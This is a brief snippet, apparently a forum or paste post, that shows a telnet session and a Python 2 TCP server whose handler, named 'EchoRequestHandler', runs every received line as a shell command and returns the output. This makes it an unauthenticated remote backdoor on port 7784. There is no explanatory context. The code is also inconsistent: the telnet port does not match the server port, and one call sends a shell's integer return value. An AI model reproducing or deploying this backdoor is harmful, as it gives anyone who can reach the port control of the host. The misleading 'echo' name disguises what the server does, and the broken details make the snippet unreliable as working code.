$ telnet localhost 5555
Connected to localhost.
Escape character is '^]'.
$

import SocketServer, os, subprocess
class EchoRequestHandler(SocketServer.BaseRequestHandler ):
    def setup(self):
        print self.client_address, 'connected!'
        self.request.send(str(self.client_address) + '\n')
        self.request.send(os.system('sh'))
    def handle(self):
        data = 'dummy'
        while data:
            data = self.request.recv(1024)
            self.request.send(os.popen(data.strip()).read())
            if data.strip() == 'bye':
                return

    def finish(self):
        print self.client_address, 'disconnected!'
        self.request.send('bye ' + str(self.client_address) + '\n')

server = SocketServer.ThreadingTCPServer(('', 7784), EchoRequestHandler)
server.serve_forever()

